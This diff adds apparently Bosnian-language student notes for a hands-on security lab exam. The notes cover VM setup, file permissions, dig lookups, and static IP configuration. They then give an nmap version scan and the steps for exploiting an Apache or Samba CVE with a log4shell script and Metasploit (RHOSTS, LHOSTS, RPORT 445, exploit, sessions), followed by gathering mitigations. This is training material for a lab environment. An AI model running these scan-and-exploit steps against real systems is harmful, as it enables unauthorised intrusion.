@@ -1,0 +1,63 @@
+1.zadatak---------------------------------------------------------------------
+uci u hyperv manager
+nastimana je virtualna masina vec VMKali, potrebno je:
+s desne strane kliknuti na virtual switch manager i kreirati privatni switch.
+poslije toga je potrebno kreirati novu virtuelnu masincu VMServerIspit:
+s desne strane NEW, virtual masina, ostale upute imaju u zadatku, iskljuciti dynamic alocation memory, dodijeliti mu privatni switch koji smo ranije kreirali.
+poslije tog bootati VMKali i VMServerIspit.
+
+2.zadatak---------------------------------------------------------------------
+kreiranje direktorija ili txt file u zavisnosti sta trazi na ispitu.
+
+kreiranje direktorija--> "mkdir IB230182", zatim izlistati sa "ls -al", u zavisnosti od zahtjeva u zadatku postaviti permisije npr. "chmod 700", poslije tog opet izlistati sa "ls -al". Sa komandom "pwd" provjeriti tacan path do direktorija
+
+kreiranje tekstualnog fajla--> "touch IB230182.txt", zatim izlistati sa "ls -al", ako je potreban upis "echo "tekst koji zelis">IB230182.txt", ako zelis provjeriti upis onda kucas "cat IB230182.txt". Ukoliko su potrebne permisije onda isti fazon sa chmod.
+
+3.zadatak---------------------------------------------------------------------
+potrebna je adresa, a ne link!!
+moguca tr slucaja barem do sad na ispitima, da trazi adresu mail servera ili adresu dns servera ili adresu web servera.
+
+ukoliko trazi mail server adresu---> kucamo komandu "dig unmo.ba mx", nakon tog dobit cemo nesto kao edge2019.edu.fit.ba, uradimo 
+"ping edge2019.edu.fit.ba" i dobit cemo u zagradi traženu adresu.
+
+ukoliko trazi adresu dns servera-->kucamo "dig mrak.ba ns" i poslije tog pingujemo ono sto smo dobili da bismo dobili adresu.
+
+ukoliko trazi adresu web servera--> kucamo "dig olx.ba A"
+
+
+4.zadatak---------------------------------------------------------------------
+prije prebacivanja VMKali na privatni switch git clone-ujemo CVE-ove ukoliko je potrebno za peti zadatak!!!
+Prebacimo VMKali na privatni switch(prvo ga turn off, pa onda desni klik settings i network adapter). Sada nam VMKali i VMServerIspit mogu komunicirati jer su oba na privatnom switchu.
+sa komandom "sudo systemctl status NetworkManager" provjeravamo da li je ugasen(ako pise INACTIVE oda jest, ako pise ACTIVE onda nije), ako je aktivan gasimo ga sa komandom "sudo systemctl stop NetworkManager"
+poslije tog kucati "ip a" i izlistat ce se loc,eth0 sta vec ima.
+na eth0 dodati ip adresu za 1 manju od one koju je prfoesor dao, ako ima neka adresa na eth0 uraditi(mozda i preventivno uradit) 
+"sudo ip addr flus dev eth0"
+dodavanje ip adrese "sudo ip addr add <adresa za broj manja>/20 dev eth0", uraditi "ping <adresa s table>"
+poslije ovog ide glavni dio odnosno NMAP --> "nmap -sV -O <adresa s table>"  tu ce se ispisat verzija apachea
+
+
+5.zadatak----------------------------------------------------------------------
+koristiti internet za provejravanje koji CVE affecta nasu verziju apachea
+ako je ona sa githuba, na githubu imaju upute kako se koristi i testira taj cve
+za log4shell uraditi(ako nece odmah da instalira requrements):
+-m venv venv
+source venv/bin/activate
+pip install -r requirements
+python3(ili python) log4shell.py -u <ipadresa>
+
+
+
+ako je metaspolit onda:
+search CVE-123-123
+use 0(ono gdje piše isknownpipename)
+show options - za one gdje required stoji YES setovati:
+RHOSTS-ipadresa s table
+LHSOTS-ipadresa s kalija(za 1 manja)
+smb_share_options-tmp
+RPORT-445
+POSLIJE TOGA IZVRISIT KOMANDU "exploit" ili "run", ako bude uspjesno onda jos dodati "sessions" i tjt moze se screenati.
+
+
+6.zadatak----------------------------------------------------------------------
+ukucati na googlu cve koji je ranjiv + mitigation, pronaci na internetu neke preventive za taj cve i zalijepiti u word.
+
